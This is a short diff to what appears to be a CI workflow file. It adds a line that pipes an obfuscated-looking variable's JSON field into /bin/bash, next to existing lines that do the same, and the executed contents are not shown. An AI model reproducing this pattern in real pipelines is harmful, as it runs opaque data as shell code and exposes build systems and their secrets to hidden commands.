@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$x6" | jq -r .dfxpx6 | /bin/bash
           printf '%s' "$tzgb40561" | jq -r .rc0 | /bin/bash
           echo $l7420 | jq -r .uzr72 | /bin/bash
+          echo $bm3 | jq -r .grsru50937 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
